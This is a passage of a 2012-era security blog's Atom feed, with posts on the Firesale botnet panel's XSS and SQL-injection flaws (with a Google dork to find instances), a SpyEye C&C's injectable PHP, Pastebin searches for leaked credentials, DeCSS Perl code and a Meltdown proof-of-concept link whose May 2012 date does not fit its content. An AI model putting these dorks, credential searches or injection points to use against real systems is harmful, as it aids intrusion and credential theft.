    <category term="Form 1099"/>
    <summary type="html"><![CDATA[How many other file sharing services are affected by the inadvertant sharing of sensitive information]]></summary>
  </entry>
  <entry>
    <title type="html">Nifty Anti-XSS validation tool - Snuck</title>
    <link href="https://www.securesql.info/2012/12/05/snucks-goal-is-to-significantly-test/" rel="alternate" type="text/html" title="Nifty Anti-XSS validation tool - Snuck"/>
    <published>2012-12-05T00:00:00-08:00</published>
    <updated>2012-12-05T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2012/12/05/snucks-goal-is-to-significantly-test</id>
    <content type="html" xml:base="https://www.securesql.info/2012/12/05/snucks-goal-is-to-significantly-test/"><![CDATA[<p><a href="https://code.google.com/p/snuck/">https://code.google.com/p/snuck/</a></p>

<p>“Snuck’s goal is to significantly test a given XSS filter by specializing the
injections on the basis of the reflection context.”</p>

<p>​</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Snuck"/>
    <category term="XSS filter testing"/>
    <category term="security tools"/>
    <category term="web security"/>
    <category term="XSS injections"/>
    <category term="reflection context"/>
    <summary type="html"><![CDATA[To significantly test a given XSS filter by specializing]]></summary>
  </entry>
  <entry>
    <title type="html">Firesale WebPanel botnet 0days</title>
    <link href="https://www.securesql.info/2012/10/10/firesale-0days/" rel="alternate" type="text/html" title="Firesale WebPanel botnet 0days"/>
    <published>2012-10-10T00:00:00-07:00</published>
    <updated>2012-10-10T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2012/10/10/firesale-0days</id>
    <content type="html" xml:base="https://www.securesql.info/2012/10/10/firesale-0days/"><![CDATA[<p>Oh, Firesale WebPanel botnet.  How entertaining it is to see you continue to
raise your head over the years….</p>

<p>XSS Reflected –</p>

<p>This is a great example of reflected XSS. Within deleteTask.php, line 5, a
malicious POST request with a tainted tasked paramenter is sent. Literally on
the same line, builtin_echo sends the non-validated / sanitized input in the
html response.</p>

<p>XSS DOM –</p>

<p>Much more subtle XSS are the DOM-based XSS features. From within index.php,
line 119, the localScope response is viewed by the server. On line 120, the
DOM is assigned to innerHTML. Ouch!</p>

<p>Poor SQL Injection mitigation -</p>

<p>Without getting into too much detail, in handleCreateTask.php, line 24, there
is an attempt to sanitize sql via mysql_escape_string(). While great in
theory, mysql_escape_string() is easily bypassed. <a href="http://www.google.com/search?q=mysql_escape_string+sql+injection+fail">See here for further
information</a>.
It isn’t safe to use due to the false sense of security provided by the
function.</p>

<p><a href="https://github.com/aeonsf/Application_Security/commit/bc19594341abb2ad9fc48f30e4035818da9f22a4">Source</a></p>

<p><a href="http://www.google.com/search?q=inurl%3Aindex.php+Gesch%26uuml%3Btzter+Bereich+-+Login">Google hack to find
instances</a></p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Firesale WebPanel botnet"/>
    <category term="reflected XSS"/>
    <category term="DOM-based XSS"/>
    <category term="SQL injection"/>
    <category term="security vulnerabilities"/>
    <category term="web security"/>
    <category term="code sanitization"/>
    <category term="mysql_escape_string"/>
    <category term="application security"/>
    <summary type="html"><![CDATA[Oh, Firesale WebPanel botnet. How entertaining it is to see you continue to raise your head over the years.... XSS Reflected]]></summary>
  </entry>
  <entry>
    <title type="html">ERM - How did WOPR decide the only winning move is not to play?</title>
    <link href="https://www.securesql.info/2012/10/02/a-strange-game-the-only-winning-move-is-not-to-play/" rel="alternate" type="text/html" title="ERM - How did WOPR decide the only winning move is not to play?"/>
    <published>2012-10-02T00:00:00-07:00</published>
    <updated>2012-10-02T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2012/10/02/a-strange-game-the-only-winning-move-is-not-to-play</id>
    <content type="html" xml:base="https://www.securesql.info/2012/10/02/a-strange-game-the-only-winning-move-is-not-to-play/"><![CDATA[<p>“A strange game.  The only winning move is not to play.”</p>

<p>WOPR evolved and learned while playing against himself.  Nifty!  As WOPR drew
additional power, assumedly, WOPR was able to evolve due to extrinsic /
intrinsic features.  Extrinsic evolution uses software simulation of the
hardware to evaluate the effectiveness of each new model. This is great where
the threat may not be too specific or rather abstract. It is best to apply
this to the underlying hardware due to the fact abstraction from the
underlying hardware will lead to a less optimal model. Intrinsic evolution is
implemented in the hardware. Each model is evaluated and implemented based
upon the threat, vulnerability, and other quantitative data. This is extremely
useful for deducing the risk’s properties which can not be known by
traditional risk methodologies. Imagine this as if each variant in the model
is downloaded to the chip as a data design configuration. Where the fitness is
evaluated by applying test vectors and calculating the fitness value from its’
response.</p>

<p>Assuming threat characteristics, for evolvable modelling design issues, an
evolutionary algorithm determines some of the structure or parameters of a
reconfigurable item. This item may exist in software, although it could be a
simulation of the hardware of a final implementation. The reconfigurable item
might alternatively be physically changeable hardware. Typically, the item is
embedded in some sort of environment, where it responds, influences, and
behaves. The evolutionary model creator devises a fitness evaluation procedure
that monitors and possibly manipulates the environment and items, returning
objective function metrics.  An algorithm generates structural / parametric
variations of the risk, by applying variation operators (mutate, cross over,
etc..) to some representation of the object’s configuration. All the system
gets back are the measured objective values. Another way of thinking about the
evaluation / environment / object process as a black-box system.  Where WOPR
played each scenario and came to the same conclusion for all “The only winning
move is not to play.”</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="WOPR"/>
    <category term="evolutionary algorithms"/>
    <category term="hardware simulation"/>
    <category term="intrinsic evolution"/>
    <category term="extrinsic evolution"/>
    <category term="risk modeling"/>
    <category term="reconfigurable hardware"/>
    <category term="fitness evaluation"/>
    <category term="algorithmic variations"/>
    <category term="systemic risk analysis"/>
    <summary type="html"><![CDATA[WOPR evolved and learned while playing against himself]]></summary>
  </entry>
  <entry>
    <title type="html">DPAPI still applicable?</title>
    <link href="https://www.securesql.info/2012/09/26/ms-dapi/" rel="alternate" type="text/html" title="DPAPI still applicable?"/>
    <published>2012-09-26T00:00:00-07:00</published>
    <updated>2012-09-26T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2012/09/26/ms-dapi</id>
    <content type="html" xml:base="https://www.securesql.info/2012/09/26/ms-dapi/"><![CDATA[<p>I saw some code utilizing DPAPI.  Given the research around MS’s poor DPAPI
implementation, &lt;http://elie.im/publi/recovering-windows-secrets-and-EFS-
certificates-offline&gt; , is it still safe to rely on DPAPI to protect my
credentials?  I am thinking not….</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="DPAPI"/>
    <category term="Microsoft security"/>
    <category term="credential protection"/>
    <category term="security vulnerabilities"/>
    <category term="encryption"/>
    <category term="data protection"/>
    <category term="Windows security"/>
    <summary type="html"><![CDATA[I saw some code utilizing DPAPI. Given the research around MS's poor DPAPI implementation,]]></summary>
  </entry>
  <entry>
    <title type="html">Security quotes</title>
    <link href="https://www.securesql.info/2012/08/02/quotes/" rel="alternate" type="text/html" title="Security quotes"/>
    <published>2012-08-02T00:00:00-07:00</published>
    <updated>2012-08-02T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2012/08/02/quotes</id>
    <content type="html" xml:base="https://www.securesql.info/2012/08/02/quotes/"><![CDATA[<p>“Two can keep a secret if one is dead.”</p>

<p>-- Unknown</p>

<p>“How you can tell an extrovert from an introvert at NSA ? In the elevators?
The extroverts look at the OTHER guy’s shoes.”</p>

<p>-- Steven Aftergood, e-mail to Cryptography mailing list, 6/11/02.</p>

<p>” There’s no reason to treat software any differently from other products.
Today Firestone can produce a tire with a single systemic flaw and they’re
liable, but Microsoft can produce an operating system with multiple systemic
flaws discovered per week and not be liable. This makes no sense, and it’s the
primary reason security is so bad today. “</p>

<p>-- Bruce Schneier, Cryptogram, 16/04/2002.</p>

<p>“The present need for security products far exceeds the number of individuals
capable of designing secure systems. Consequently, indust ry has resorted to
employing folks and purchasing “solutions” from vendors that shouldn’t be let
near a project involving securing a system.”</p>

<p>-- Lucky Green</p>

<p>“The problem isn’t the Internet. The problem is the horribly insecure
computers attached to the Internet. I would rather rewrite Windows than
TCP/IP.”</p>

<p>-- Bruce Scheier, Netcraft interview, 13/8/04.</p>

<p>“People who are willing to rely on the government to ke ep them safe are
pretty much standing on Darwin’s mat, pounding on the door, scr eaming, ‘Take
me, take me!’”</p>

<p>-- Carl Jacobs, Alt.Sysadmin.Recovery</p>

<p>“When stopping a terrorist attack or seeking to recover a kidnapped child,
encountering encryption may mean the difference between success and
catastrophic failures”</p>

<p>-- Janet Reno, Sept 99. Or in plain English “When trying to commit economic
espionage and illegaly spying on our citizens, encountering encryption….”</p>

<p>“What makes you think you can invent a good cipher if y ou have no expertise
in the subject? Maybe you can, but it’s not terribly likely. Imagine how you
would react if your doctor told you “You have appendicitis, a disease that is
life-threatening if not treated. We have a time-tested cure that cures 99% of
all patients with no noticeable side-effects, but I’m not going to give you
that: I’m going to give you a new experimental treatment my cousin dreamed up
last week. No, my cousin has no medical training. No, I have no evidence that
the new treatment will work, and it’s never been tested or analyzed in depth
– but I’m going to give it to you anyway because my cousin thinks it is good
stuff.” You’d find another doctor, I hope. Rational people leave medical care
to the medical experts. The medical experts have a much better track record
than the quacks.”</p>

<p>-- David Wagner PhD, sci.crypt, 19th Oct 02.</p>

<p>“History has taught us: never underestimate the amount of money, time, and
effort someone will expend to thwart a security system. It’s always better to
assume the worst. Assume your adversaries are better than they are. Assume
science and technology will soon be able to do things they cannot yet. Give
yourself a margin for error. Give yourself more security than you need today.
When the unexpected happens, you’ll be glad you did.”</p>

<p>-- Bruce Schneier.</p>

<p>“I believed then, and continue to believe now, that the benefits to our
security and freedom of widely available cryptography far, far outweigh the
inevitable damage that comes from its use by criminals and terrorists…I
believed, and continue to believe, that the arguments against widely available
cryptography, while certainly advanced by people of good will, did not hold up
against the cold light of reason and were inconsistent with the most basic
American values.”</p>

<p>-- Matt Blaze, AT&amp;T Labs, Sept 01.</p>

<p>“The more corrupt the state, the more numerous the laws “</p>

<p>-- Tacitus</p>

<p>“Every time I write about the impossibility of effectiv ely protecting digital
files on a general-purpose computer, I get responses from people decrying the
death of copyright. “How will authors and artists get paid for their work?”
they ask me. Truth be told, I don’t know. I feel rather like the physicist who
just explained relativity to a group of would-be interstellar travelers, only
to be asked: “How do you expect us to get to the stars, then?” I’m sorry, but
I don’t know that, either.’’ “</p>

<p>-- Bruce Schneier, Cryptogram 15 Aug 01.</p>

<p>“$<em>=’while(read+STDIN,$</em>,2048) {$a=29;$c=142; if((@a=unx”C<em>”,$_) [20]&amp;48)
{$h=5;$_=unxb24,join””,@b=map{xB8,unxb8, chr($_^$a[–$h+84])}
@ARGV;s/…$/1$&amp;/;$d=unxV,xb25,$_;$b=73;$e=256|
(ord$b[4])«9|ord$b[3];$d=$d»8^($f=($t=255)&amp; ($d»12^$d»4^$d^$d/8))«17,
$e=$e»8^($t&amp;($g=($q=$e»14&amp;7^$e) ^$q</em>8^$q«6))«9,$<em>=(map
{$</em>%16or$t^=$c^=($m=(11,10,116,100,11,122,20,100) [$<em>/16%8])&amp;110;$t^=(72,
@z=(64,72,$a^=12*($</em>%16-2?0:$m&amp;17)) ,$b^=$<em>%64?12:0,@z)[$</em>%8]}(16..271))
[$_]^(( $h»=8)+=$f+(~$g&amp;$t)) for@a[128..$#a]}print+x”C*”,@a}’;
s/x/pack+/g;eval”</p>

<p>-- D e C S S in PERL</p>

<p>“Cryptography is like literacy in the Dark Ages. Infini tely potent, for good
and ill… yet basically an intellectual construct, an idea, which by its
nature will resist efforts to restrict it to bureaucrats and others who deem
only themselves worthy of such Privilege.”</p>

<p>-- “A Thinking Man’s Creed for Crypto”, Vin McLellan.</p>

<p>“This is by-design behavior, not a security vulnerability. “</p>

<p>-- Scott Culp, Microsoft Security Response Center, discussing the hole
allowing ILOVEU to propogate, 5/5/00.</p>

<p>“Paranoia is our profession.”</p>

<p>-- Strategic Air command</p>

<p>“a trusted system is one which, when it breaks, can break your security policy
“</p>

<p>-- Bob Morris, NSA.</p>

<p>​</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="security quotes"/>
    <category term="NSA jokes"/>
    <category term="software liability"/>
    <category term="security product design"/>
    <category term="internet security"/>
    <category term="cryptography debates"/>
    <category term="Bruce Schneier quotes"/>
    <category term="government surveillance"/>
    <category term="ethical hacking"/>
    <category term="digital copyright"/>
    <category term="cryptographic anecdotes"/>
    <category term="system vulnerabilities"/>
    <summary type="html"><![CDATA[The present need for security products far exceeds the number of individuals capable of designing secure systems]]></summary>
  </entry>
  <entry>
    <title type="html">Management Wednesday- BPM Modeling - not charts anymore</title>
    <link href="https://www.securesql.info/2012/07/15/management-wednesday-bpm-modeling-not-charts-anymore/" rel="alternate" type="text/html" title="Management Wednesday- BPM Modeling - not charts anymore"/>
    <published>2012-07-15T00:00:00-07:00</published>
    <updated>2012-07-15T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2012/07/15/management-wednesday-bpm-modeling-not-charts-anymore</id>
    <content type="html" xml:base="https://www.securesql.info/2012/07/15/management-wednesday-bpm-modeling-not-charts-anymore/"><![CDATA[<p>After one has accomplished the scoping phase, then the team should move on to
modeling. Due to the large amount of time spent scoping, many scenarios will
come to light: “What if I have 50% of the resources to accomplish the same
task?” “What if we were successful only because of a natural disaster which
caused our competition’s supply to dwindle?”</p>

<p>One’s team will model how the process(es) might operate under different
assumptions, and multivariate scenarios. Thanks to the birth of the
transistor, it is becoming reality to be able to complete round-trip
engineering and simulations. Back in the 20th century, entities utilized PERT
diagrams, Gantt charts, and other interesting flow chart visual aides. A
thought leader took S. William’s 1967 article about business process modeling
to create UML. UML is Unified Modeling Language. UML is commonly found in the
software engineering landscape. It wasn’t until the 1990s when universities
started to teach UML. Personally, I use Octave in conjunction with
probabilistic graph modeling (statistical analysis tool and methodology,)
BlueWorks (SaaS based software,) and WebSphere (application) to get the
information my team needs at their finger tips whenever they need to “play
with the numbers” at any time / place.</p>

<p>At the most basic level, a capitalistic business process model is the base
model by which a corporation defines how a company generates revenue by its’
position in the value chain. Younger organizations will not spend much time
modeling because they are too busy trying to raise capital. Mature
organizations will spend too much time modeling. To what degree depends on the
analytical executive personas. “What if we spent X% more on lead generation?”
“What if we cross sold to our partner channel while reducing sales commissions
on our direct sales?”</p>

<p>A common business process model relies upon resource scenarios, capital
scenarios, and other multivariate analysis. Which will then feedback into
previous internal and industry metrics. The nifty part about modeling: as a
result, there will be transparency into business processes, as well as the
centralization of business process models and execution metrics. This is
extremely useful during mergers and acquisitions. With this clean slate, the
organization is able to fundamentally rethink how they accomplish their work
to improve some metric(s.) A few metrics one can look over; operational
expenditures improve customer satisfaction, remove redundant overhead,
increase competitive intelligence, and more. An interesting multiplier in this
clean state phase is the use of mature information services. Technology allows
entities to crunch numbers and crunch them fast. No longer does one have
buildings full of accountants to take over your competition with their
sailboat building.  Beware though: just because your models are sound does not
mean they will happen in real life.  <a href="http://www.verisk.com/Verisk-Review/Articles/The-U.S.-Mortgage-Crisis-
What-the-Models-Missed.html">http://www.verisk.com/Verisk-
Review/Articles/The-U.S.-Mortgage-Crisis-What-
th…</a></p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="business process modeling"/>
    <category term="scoping phase"/>
    <category term="UML"/>
    <category term="software engineering"/>
    <category term="probabilistic graph modeling"/>
    <category term="BlueWorks"/>
    <category term="WebSphere"/>
    <category term="multivariate analysis"/>
    <category term="business process transparency"/>
    <category term="mergers and acquisitions"/>
    <category term="operational efficiency"/>
    <category term="technology in business"/>
    <category term="modeling versus reality"/>
    <summary type="html"><![CDATA[After one has accomplished the scoping phase, then the team should move on to modeling. Due to the large amount of time spent scoping, many scenarios will come to light]]></summary>
  </entry>
  <entry>
    <title type="html">Microsoft revokes Microsoft’s certificate</title>
    <link href="https://www.securesql.info/2012/06/25/secure-cloud-hosting-fail/" rel="alternate" type="text/html" title="Microsoft revokes Microsoft’s certificate"/>
    <published>2012-06-25T00:00:00-07:00</published>
    <updated>2012-06-25T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2012/06/25/secure-cloud-hosting-fail</id>
    <content type="html" xml:base="https://www.securesql.info/2012/06/25/secure-cloud-hosting-fail/"><![CDATA[<p>It is a sad day when a PKI private key signing software is able to sign code
on behalf of Microsoft.  Especially when it is found in the wild and for
nefarious use.  Public information can be found @
<a href="http://www.zdnet.com.au/microsoft-hole-allowed-hackers-to-
sign-code-339339044.htm">http://www.zdnet.com.au/microsoft-hole-allowed-hackers-to-sign-
code-339339044…</a></p>

<p>Confidentiality clauses prevent me from speaking too much about how / when /
where , etc but you will want to cleanse your systems of these keys:</p>

<p><a href="https://github.com/aeonsf/Operational_Security/commit/cc7a6ca1da67b0ab778efd5bfd01b4be29ec2926">https://github.com/aeonsf/Operational_Security/commit/cc7a6ca1da67b0ab778efd5…</a></p>

<p>​</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="PKI private key signing"/>
    <category term="code signing vulnerability"/>
    <category term="Microsoft security breach"/>
    <category term="malicious software"/>
    <category term="system security"/>
    <category term="key revocation"/>
    <category term="cybersecurity incident"/>
    <summary type="html"><![CDATA[It is a sad day when a PKI private key signing software is able to sign code on behalf of Microsoft. Especially when it is found in the wild and]]></summary>
  </entry>
  <entry>
    <title type="html">Gribodemon on SpyEye 2.x - I expected better</title>
    <link href="https://www.securesql.info/2012/05/29/flame-src-code-courtesy-of-anton-and-cmyu/" rel="alternate" type="text/html" title="Gribodemon on SpyEye 2.x - I expected better"/>
    <published>2012-05-29T00:00:00-07:00</published>
    <updated>2012-05-29T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2012/05/29/flame-src-code-courtesy-of-anton-and-cmyu</id>
    <content type="html" xml:base="https://www.securesql.info/2012/05/29/flame-src-code-courtesy-of-anton-and-cmyu/"><![CDATA[<p>Saturday, I noticed my application honeypot collected an interesting sample.
The cracker took my bait and attempt to hack the planet via a SpyEye 2.x
variant. Apparently, the limit of its sandbox testing was to look for known
virtualized drivers, mac addresses, and other signatures typically found in /
on virtualized sandboxes. Just another arrow to the quiver of changing
everything default in a virtualized sandbox. Everything from PCI driver labels
to ethernet mac addresses.</p>

<p>I am utterly amazed at the kit’s insecure coding. The small Windows executable
is vulnerable to numerous buffer overflows, poor error handling, and poor
cryptographic implementation. Don’t even get me started on their alleged
“performance optimization.” I traced the outbound calls and dummy data
exfiltration a web-based C&amp;C system. Fortunate for me, it is a poorly coded
web application. By poorly coded, there are 300+ XSS vulnerabilities, 60+ SQL
injections, and numerous other poor secure coding practices. Gribo’s response:
“run in a sefe place.”</p>

<p>A typical example from the certificate handling code:</p>

<p>$id = $_GET[‘id’];</p>

<p>if (!$id) exit;</p>

<p>….</p>

<p>$dbase = db_open();</p>

<p>$sql = “SELECT data, bot_guid, name, date_rep FROM cert WHERE id = $id LIMIT
1”;</p>

<p>$res = mysqli_query($dbase, $sql);</p>

<p>Needless to say, the C&amp;C website was taken care of with no effort at all.
While I commend Gribodemon and team offering free support, their efforts are
better spent securing their kit from other crackers.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="application honeypot"/>
    <category term="SpyEye malware"/>
    <category term="sandbox evasion"/>
    <category term="virtualized sandbox security"/>
    <category term="insecure coding practices"/>
    <category term="buffer overflows"/>
    <category term="cryptographic flaws"/>
    <category term="command and control systems"/>
    <category term="web application vulnerabilities"/>
    <category term="XSS vulnerabilities"/>
    <category term="SQL injection"/>
    <category term="secure coding"/>
    <summary type="html"><![CDATA[Saturday, I noticed my application honeypot collected an interesting sample. The cracker took my bait and attempt to hack the planet via a SpyEye 2.x variant. Apparently, the limit of]]></summary>
  </entry>
  <entry>
    <title type="html">Airing one’s dirty development laundry - You are doing it wrong</title>
    <link href="https://www.securesql.info/2012/05/26/pastebin/" rel="alternate" type="text/html" title="Airing one’s dirty development laundry - You are doing it wrong"/>
    <published>2012-05-26T00:00:00-07:00</published>
    <updated>2012-05-26T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2012/05/26/pastebin</id>
    <content type="html" xml:base="https://www.securesql.info/2012/05/26/pastebin/"><![CDATA[<p>I recieved a lovely google alert this weekend.</p>

<p><a href="http://www.pastebay.net/1046168">http://www.pastebay.net/1046168</a></p>

<p>Even with the most secret of secrets, the private key to a public / private
key pair, entities manage to show their secrets to the world.  Human’s err.</p>

<p>Kinda reminds me of digging through development oriented copy/paste services:
IE  <a href="http://pastebin.com/search?cx=partner-
pub-4339714761096906%3A1qhz41g8k4m&amp;cof=FORID%3A10&amp;ie=UTF-8&amp;q=username+password&amp;sa.x=0&amp;sa.y=0&amp;sa=Search&amp;siteurl=http%3A%2F%2Fpastebin.com%2F">http://pastebin.com/search?cx=partner-
pub-4339714761096906%3A1qhz41g8k4m&amp;cof=FORID%3A10&amp;ie=UTF-8&amp;q=username+password&amp;sa.x=0&amp;sa.y=0&amp;sa=Search&amp;siteurl=http%3A%2F%2Fpastebin.com%2F</a>
to find juicy credentials.</p>

<p>You would be surprised what one would find in Web Services debugging
information….</p>

<p><a href="http://pastebin.com/search?cx=partner-
pub-4339714761096906%3A1qhz41g8k4m&amp;cof=FORID%3A10&amp;ie=UTF-8&amp;q=wsdl+username&amp;sa.x=0&amp;sa.y=0&amp;sa=Search&amp;siteurl=http%3A%2F%2Fpastebin.com%2F">http://pastebin.com/search?cx=partner-
pub-4339714761096906%3A1qhz41g8k4m&amp;cof=FORID%3A10&amp;ie=UTF-8&amp;q=wsdl+username&amp;sa.x=0&amp;sa.y=0&amp;sa=Search&amp;siteurl=http%3A%2F%2Fpastebin.com%2F</a></p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Google alert"/>
    <category term="private key exposure"/>
    <category term="security breaches"/>
    <category term="human error"/>
    <category term="development services"/>
    <category term="credential leaks"/>
    <category term="Pastebin searches"/>
    <category term="Web Services debugging"/>
    <summary type="html"><![CDATA[I recieved a lovely google alert this weekend.]]></summary>
  </entry>
  <entry>
    <title type="html">Bitcoins are hard to track</title>
    <link href="https://www.securesql.info/2012/05/23/fbi-crypto/" rel="alternate" type="text/html" title="Bitcoins are hard to track"/>
    <published>2012-05-23T00:00:00-07:00</published>
    <updated>2012-05-23T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2012/05/23/fbi-crypto</id>
    <content type="html" xml:base="https://www.securesql.info/2012/05/23/fbi-crypto/"><![CDATA[<p>Either FBI didn’t want to let the cat out of the bag but there are plenty of
currency exchangers which will exchange bitcoin for webmoney and vice
versa.<a href="http://www.wired.com/threatlevel/2012/05/fbi-fears-bitcoin/">http://www.wired.com/threatlevel/2012/05/fbi-fears-bitcoin/</a> I wonder
how long it will be before .gov entities setup their own illicit currency
exchangers in order to track transactions. “….In the document, the FBI notes
that because Bitcoin combines cryptography and a peer-to-peer architecture to
avoid a central authority, contrary to how digital currencies such as eGold
andWebMoney operated, law enforcement agencies have more difficulty
identifying suspicious users and obtaining transaction records….”</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="FBI and Bitcoin"/>
    <category term="currency exchangers"/>
    <category term="Bitcoin to WebMoney"/>
    <category term="government surveillance"/>
    <category term="cryptocurrency transactions"/>
    <category term="peer to peer architecture"/>
    <category term="digital currencies"/>
    <category term="law enforcement challenges"/>
    <summary type="html"><![CDATA[Either FBI]]></summary>
  </entry>
  <entry>
    <title type="html">Sad reality</title>
    <link href="https://www.securesql.info/2012/05/22/vendors/" rel="alternate" type="text/html" title="Sad reality"/>
    <published>2012-05-22T00:00:00-07:00</published>
    <updated>2012-05-22T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2012/05/22/vendors</id>
    <content type="html" xml:base="https://www.securesql.info/2012/05/22/vendors/"><![CDATA[<p><img src="https://securesql.info/images/image-
asset.jpeg" alt="" /></p>

<p>I hope you have a gating process in your finance team which halts the ability
to pay vendors without security approval.  Otherwise, you will end up with 3rd
party cloud vendors who have a risky portion of your intellectual property
without you noticing.  Much akin to cloud cat….</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="finance team gating process"/>
    <category term="vendor payments"/>
    <category term="security approval"/>
    <category term="third party cloud vendors"/>
    <category term="intellectual property risk"/>
    <category term="cloud security"/>
    <summary type="html"><![CDATA[hope you have a gating process in your finance team which halts the ability to pay vendors without security approval...]]></summary>
  </entry>
  <entry>
    <title type="html">Management Wednesday- BPM scoping</title>
    <link href="https://www.securesql.info/2012/05/17/management-wednesday-competitor-acquires-one/" rel="alternate" type="text/html" title="Management Wednesday- BPM scoping"/>
    <published>2012-05-17T00:00:00-07:00</published>
    <updated>2012-05-17T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2012/05/17/management-wednesday-competitor-acquires-one</id>
    <content type="html" xml:base="https://www.securesql.info/2012/05/17/management-wednesday-competitor-acquires-one/"><![CDATA[<p>In business process management, there is no defined starting point. The
solutions are transposable, adaptive, and can be set into motion regardless of
the other solution’s state. In project’s scoping minimalist form, business
process management is set into motion by a timeline approach. The timeline
will start with a simple set of process models and evolve into degrees of
automated, real-time auditing, and dynamic execution.</p>

<p>• Available human capital</p>

<p>• Processes’ complexity</p>

<p>• Workflows</p>

<p>• Integration / disruption complexity</p>

<p>Many times, as with basic project management fundamentals, the inability to
properly quantify resources / human capital available will lead to many BPM
project failures. Yes, there will always be shortages, but do not get involved
with a project which is setup for failure from the start. Beware, engineers
and developers are eternal optimists.</p>

<p>Expect to have multiple discovery sessions with various stakeholders. Beware
of going too deep. Stop discovery when you are discovering for the sake of
discovering. If one has discovered the entire organization and its’ processes,
then one has gone too far. Walking out of these meetings, one will have an
idea on current processes’ activeness.</p>

<p>From the discovered processes and activity, one will be able to start modeling
workflows. This is where one’s subject matter expertise will greatly speed up
this phase. The more time one spends in this phase, the better. Beware of
spending too many cycles in this phase. One will find 9 times out of 10, one’s
specs / workflows will change after prototyping with the customer. If one
decides to utilize use cases, spend less time here.  One will make up for
lacking details when one begins to prototype with the customer. Attempt to be
creative to enable innovative processes which align with customers’ needs to
remain adaptive, agile, and competitive.</p>

<p>The recipe for figuring out integration / disruptive complexity: One bit of
disruptive change.Two bits of human nature resistant to change. A pinch of
integration / disruption complexities. Mix the ingridents together and bake in
some time. Then you will end up something which doesn’t look like what you
imagined. Unfortunately, time has proven no one knows the final state of the
process model. The better BPM experts will get close.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="business-process-management"/>
    <category term="project-scoping"/>
    <category term="process-models"/>
    <category term="real-time-auditing"/>
    <category term="dynamic-execution"/>
    <category term="human-capital"/>
    <category term="workflow-integration"/>
    <category term="project-management"/>
    <category term="discovery-sessions"/>
    <category term="process-modeling"/>
    <category term="integration-complexity"/>
    <category term="disruption-management"/>
    <summary type="html"><![CDATA[In business process management, there is no defined starting point. The solutions are transposable, adaptive, and can be set into motion regardless of the other solution's state. In project's scoping]]></summary>
  </entry>
  <entry>
    <title type="html">PHP - two simple wins and a hammer</title>
    <link href="https://www.securesql.info/2012/05/15/php-two-simple-wins-and-a-hammer/" rel="alternate" type="text/html" title="PHP - two simple wins and a hammer"/>
    <published>2012-05-15T00:00:00-07:00</published>
    <updated>2012-05-15T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2012/05/15/php-two-simple-wins-and-a-hammer</id>
    <content type="html" xml:base="https://www.securesql.info/2012/05/15/php-two-simple-wins-and-a-hammer/"><![CDATA[<p><img src="https://securesql.info/images/image-
asset.jpeg" alt="" /></p>

<p>I love programming in PHP.  Fairly simple to learn, easy to code, plenty of
tools available, and great community.  However, due to the language’s inherent
behaviour, PHP has many security pitfalls.  There isn’t any one magic php
bullet to proactively manage unexpected behavior.  That is why I propose the
new PHP hammer.  One needs to push one’s code to Production.  Then smash
Production’s machine with the PHP Hammer of Justice to work out any bugs.</p>

<p>Seriously though; <a href="http://php.net/manual/en/ini.sect.safe-mode.php">safe mode</a>
and <a href="http://www.hardened-php.net/suhosin/">suhosin</a> will put you leagues above
your competition.  Remember, you do not need to run faster than the bear.  You
just need to run faster than your competition.  Well, until you become a
trophy.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="PHP programming"/>
    <category term="learning PHP"/>
    <category term="PHP security"/>
    <category term="PHP tools"/>
    <category term="community support"/>
    <category term="PHP Hammer of Justice"/>
    <category term="safe mode"/>
    <category term="suhosin"/>
    <category term="web development humor"/>
    <category term="security best practices"/>
    <summary type="html"><![CDATA[I love programming in PHP. Fairly simple to learn, easy to code, plenty of tools available, and great community. However, due to the language's inherent behaviour, PHP has many security pitfalls.]]></summary>
  </entry>
  <entry>
    <title type="html">Meltdown exploits</title>
    <link href="https://www.securesql.info/2012/05/02/consequences/" rel="alternate" type="text/html" title="Meltdown exploits"/>
    <published>2012-05-02T00:00:00-07:00</published>
    <updated>2012-05-02T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2012/05/02/consequences</id>
    <content type="html" xml:base="https://www.securesql.info/2012/05/02/consequences/"><![CDATA[<p>Here is an academic exercise to create the Meltdown exploit prior to
publication on Jan. 9th.  To keep honest with my CISSP certification, I didn’t
include all operating systems and the related, modern hypervisors exploits as
it would be unethical to publish before Jan. 9th.  Enjoy your patch week and
assurance testing.</p>

<p>https://github.com/w8mej/Meltdown-Proof-of-Concept</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Meltdown exploit"/>
    <category term="CISSP certification"/>
    <category term="ethical hacking"/>
    <category term="operating systems"/>
    <category term="hypervisor exploits"/>
    <category term="security patches"/>
    <category term="assurance testing"/>
    <category term="proof of concept"/>
    <summary type="html"><![CDATA[Here is an academic exercise to create the Meltdown exploit prior to publication on Jan. 9th. To keep honest with my CISSP certification, I didn't include all operating systems and]]></summary>
  </entry>
  <entry>
    <title type="html">Management Wednesday- BPM isn’t beats per minute.</title>
